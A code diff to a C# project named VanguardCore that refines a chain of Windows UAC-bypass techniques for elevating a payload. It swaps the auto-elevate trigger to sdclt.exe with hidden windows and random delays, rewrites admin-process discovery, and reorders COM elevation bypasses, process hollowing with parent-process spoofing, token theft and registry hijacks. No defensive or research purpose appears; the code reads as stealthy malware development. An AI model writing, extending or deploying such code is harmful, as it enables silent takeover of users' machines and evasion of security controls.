@@ -440,12 +440,13 @@ namespace VanguardCore
 
                 Thread.Sleep(rnd.Next(500, 1500));
                 
-                // Trigger via computerdefaults.exe (obfuscated trigger name in real use)
+                // Trigger via sdclt.exe (Silent Backup trigger)
                 string trigger = SafetyManager.GetSecret("MS_TRIGGER");
-                if (string.IsNullOrEmpty(trigger)) trigger = "computerdefaults.exe";
+                if (string.IsNullOrEmpty(trigger)) trigger = "sdclt.exe";
                 
                 Process.Start(new ProcessStartInfo { 
                     FileName = trigger, 
+                    Arguments = "/kickoffgui", // Special flag for sdclt to trigger command
                     UseShellExecute = true, 
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden
@@ -472,8 +473,7 @@ namespace VanguardCore
 
         public static int FindTargetAdminProcess()
         {
-            Log("Scanning for admin process target (V3)...");
-            int bestPid = -1;
+            Log("Scanning for admin process target (V3.1)...");
             int currentPid = Process.GetCurrentProcess().Id;
             int currentSession = Process.GetCurrentProcess().SessionId;
 
@@ -486,26 +486,20 @@ namespace VanguardCore
                 {
                     if (proc.Id == currentPid) continue;
                     
-                    // Filter by architecture (NativeAOT is 64-bit)
-                    if (Is32Bit(proc.Handle)) continue;
+                    string name = proc.ProcessName.ToLower();
+                    bool isTarget = false;
+                    foreach (var t in topTargets) if (name.Contains(t)) { isTarget = true; break; }
 
-                    // Filter by protection (Skip PPL/System critical)
-                    if (IsProtected(proc.Id)) continue;
-
-                    // Try to check elevation
-                    if (IsProcessElevated(proc.Id))
+                    if (isTarget && proc.SessionId == currentSession)
                     {
-                        Log($"Found Admin Process: {proc.ProcessName} (PID: {proc.Id})");
-                        
-                        // Favor processes in our session if we need GUI, or Session 0 for persistence
-                        if (proc.SessionId == currentSession) return proc.Id;
-                        bestPid = proc.Id;
+                        Log($"Found Target Process (Name Match): {proc.ProcessName} (PID: {proc.Id})");
+                        return proc.Id;
                     }
                 }
                 catch { }
             }
 
-            return bestPid;
+            return -1;
         }
 
         private static bool Is32Bit(IntPtr hProcess)
@@ -532,6 +526,7 @@ namespace VanguardCore
             IntPtr hProcess = IntPtr.Zero;
             try
             {
+                // Note: This may fail for non-admins, but V3.1 uses Name-based discovery as primary.
                 hProcess = Native.OpenProcess(0x0400 /* PROCESS_QUERY_INFORMATION */, false, pid);
                 if (hProcess == IntPtr.Zero) return false;
 
@@ -562,32 +557,32 @@ namespace VanguardCore
         {
             try
             {
-                Log("V3 Elevation: Starting Process Discovery...");
+                Log("V3.1 Elevation: Starting Process Discovery...");
                 
-                // 1. Discovery
+                // 1. Discovery (Name based for stability in non-admin context)
                 int targetPid = FindTargetAdminProcess();
                 if (targetPid == -1)
                 {
-                    Log("V3 Discovery: No suitable admin targets found.");
-                    return false; // Fallback to next method in chain
+                    Log("V3.1 Discovery: No suitable targets found in current session.");
+                    return false;
                 }
 
                 string targetPath = "taskhostw.exe"; 
-                Log($"V3 Injection Target identified: PID {targetPid} ({targetPath})");
+                Log($"V3.1 Injection Target identified: PID {targetPid}");
                 
                 // 2. Execute Hollowing / Spoofing
                 if (HollowIntoNewProcess(targetPath))
                 {
-                    Log("V3 Injection: Success. Exit parent.");
+                    Log("V3.1 Injection: Success. Exit parent.");
                     return true; 
                 }
 
-                Log("V3 Injection: Failed to spawn child with PPID spoof.");
+                Log("V3.1 Injection: Failed to spawn child with PPID spoof.");
                 return false;
             }
             catch (Exception ex)
             {
-                Log("V3 Injection ex: " + ex.ToString());
+                Log("V3.1 Injection ex: " + ex.ToString());
                 return false;
             }
         }
@@ -669,38 +664,33 @@ namespace VanguardCore
 
             string args = $"--uac-child --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
 
-            // === Order: Most Modern & Stealthy -> Fallback ===
+            // === V3.1 Optimized Priority Chain ===
 
-            // 0. V3 Hardcore (Process Discovery & Injection/Hollowing)
-            if (InjectAndBypass(payloadPath)) 
-            {
-                // If InjectAndBypass returned true, it means it successfully SPAWNED a child.
-                // The caller in Program.cs handles killing the parent.
-                return true;
-            }
-            Log("V3 Elevation failed. Falling back to standard chain...");
-
-            // 1. MsSettings (Modern Registry Hijack)
-            if (BypassMsSettingsDelegate(payloadPath, args)) return true;
-            if (IsAdmin()) return true; // Re-check in case child process elevated us
-
-            // 2. IExplorerCommand (Professional COM)
-            if (BypassExplorerCommand(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (IsAdmin()) return true;
-
-            // 3. ICMLuaUtil (Classic COM)
+            // 1. Silent COM: ICMLuaUtil
             if (BypassCmluaUtil(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
             if (IsAdmin()) return true;
 
-            // 4. Tokenvator (Explorer Theft)
-            if (BypassTokenvator(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (IsAdmin()) return true;
-
-            // 5. ColorDataProxy
+            // 2. Silent COM: ColorDataProxy
             if (BypassColorDataProxy(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
             if (IsAdmin()) return true;
 
-            // 6. IFwCplLua
+            // 3. V3 Hardcore (Injection / PPID Spoofing)
+            if (InjectAndBypass(payloadPath)) return true;
+            if (IsAdmin()) return true;
+
+            // 4. Token Theft: Tokenvator
+            if (BypassTokenvator(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            if (IsAdmin()) return true;
+
+            // 5. Silent COM: IExplorerCommand
+            if (BypassExplorerCommand(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            if (IsAdmin()) return true;
+
+            // 6. Registry: MsSettings + sdclt (Last resort before prompt)
+            if (BypassMsSettingsDelegate(payloadPath, args)) return true;
+            if (IsAdmin()) return true;
+
+            // 7. Silent COM: IFwCplLua
             if (BypassFwCplLua(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
             if (IsAdmin()) return true;
 
